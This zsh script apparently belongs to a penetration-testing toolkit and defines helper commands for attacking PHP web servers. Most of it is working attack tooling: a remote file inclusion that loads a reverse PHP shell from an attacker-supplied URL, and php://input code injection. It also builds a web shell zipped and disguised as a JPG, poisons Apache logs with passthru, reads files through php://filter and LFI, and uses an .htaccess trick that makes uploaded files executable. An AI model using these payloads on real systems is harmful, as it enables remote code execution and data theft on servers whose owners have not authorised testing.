#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-php
#############################################################

qq-enum-web-php-help() {
    cat << "DOC"

qq-enum-web-php
----------------
The qq-enum-web-php namespace contains commands for discovering web content, directories and files
on PHP web servers

Commands
--------
qq-enum-web-php-install:                 installs dependencies
qq-enum-web-php-ffuf:                    scan for PHP files
qq-enum-web-php-rfi:                     exploit typical RFI params
qq-enum-web-php-rfi-input 
qq-enum-web-php-lfi-proc-self-environ
qq-enum-web-php-lfi-filter-resource
qq-enum-web-php-lfi-zip-jpg-shell
qq-enum-web-php-lfi-logfile
qq-enum-web-php-gen-htaccess:            generate an htaccess file
qq-enum-web-php-phpinfo:                 generate phpinfo payload

DOC
}

qq-enum-web-php-install() {
    __info "Running $0..."
    __pkgs curl seclists wordlists
    qq-install-golang
    go get -u github.com/ffuf/ffuf
    go get -v -u github.com/tomnomnom/httprobe
}

qq-enum-web-php-ffuf() {
    __check-project
    qq-vars-set-url
    qq-vars-set-wordlist
    __check-threads
    local d && __askvar d "RECURSION DEPTH"
    print -z "ffuf -p 0.1 -t ${__THREADS} -recursion -recursion-depth ${d} -H \"User-Agent: Mozilla\" -fc 404 -w ${__WORDLIST} -u ${__URL}/FUZZ -e ${__EXT_PHP} -o $(__urlpath)/ffuf-dirs-php.csv -of csv"
}

qq-enum-web-php-rfi() {
    __ask "URL should contain a URI like /page.php?rfi="
    qq-vars-set-url
    __ask "PAYLOAD URL should contain reverse php shell"
    local p && __askvar p PAYLOAD_URL
    print -z "curl -k -v -XGET \"${__URL}${p}%00\" "
}

qq-enum-web-php-rfi-input() {
    __ask "URL should contain a URI like /page.php?rfi="
    qq-vars-set-url
    print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${__URL}php://input%00\" "
}

qq-enum-web-php-lfi-proc-self-environ() {
    __ask "URL should contain a URI like /page.php?lfi="
    qq-vars-set-url
    print -z "curl -k -v -A \"<?=phpinfo(); ?>\" \"${__URL}../../../proc/self/environ\" "
}

qq-enum-web-php-lfi-filter-resource(){
    __ask "URL should contain a URI like /page.php?lfi="
    qq-vars-set-url
    __ask "Set path to a remote file"
    local f && __askvar f REMOTE_FILE
    print -z "curl -k -v -XGET \"${__URL}php://filter/convert.base64-encode/resource=${f}\" "
}

qq-enum-web-php-lfi-zip-jpg-shell() {
    __ask "URL should contain a URI like /page.php?lfi="
    qq-vars-set-url

    echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
    zip payload.zip payload.php
    mv payload.zip shell.jpg

    __info "Created shell.jpg"
    __warn "First upload shell.jpg to target"

    print -z "curl -k -v -XGET \"${__URL}zip://shell.jpg%23payload.php?cmd=\" "
}

qq-enum-web-php-lfi-logfile() {
    __ask "URL should contain a URI like /page.php?lfi="
    qq-vars-set-url
    local b && __askvar b "TARGET URL"
    curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
    __info "lfi request completed"
    print -z "curl -k -v \"${__URL}../../../../../var/log/apache2/access.log&cmd=whoami\" "
}

qq-enum-web-php-gen-htaccess() {
    local e && __askvar e Extension
    __ask "Upload .htaccess file to make alt extension executable by PHP"
    print -z "echo \"AddType application/x-httpd-php ${e}\" > htaccess"
}

qq-enum-web-php-phpinfo() {
    print -z "echo \"<html><body><p>PHP INFO PAGE</p><br /><?php phpinfo(); ?></body></html>\" > phpinfo.php"
}